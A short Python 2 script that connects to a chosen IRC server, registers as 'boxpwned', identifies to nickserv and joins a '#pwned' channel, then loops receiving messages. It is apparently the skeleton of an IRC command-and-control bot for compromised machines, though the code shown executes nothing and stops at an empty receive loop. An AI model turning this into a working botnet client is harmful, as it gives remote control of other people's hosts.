import string
import socket
import sys
import os
server = raw_input("irc server [irc.somthing.net]:")      
channel = "#pwned"
botnick = "boxpwned" 
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
irc.connect((server, 6667))                                             
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :PWNED\n") 
irc.send("NICK "+ botnick +"\n")                
irc.send("PRIVMSG nickserv :DAVID\r\n")    
irc.send("JOIN "+ channel +"\n")       
while 1:   
   text=irc.recv(2040) 
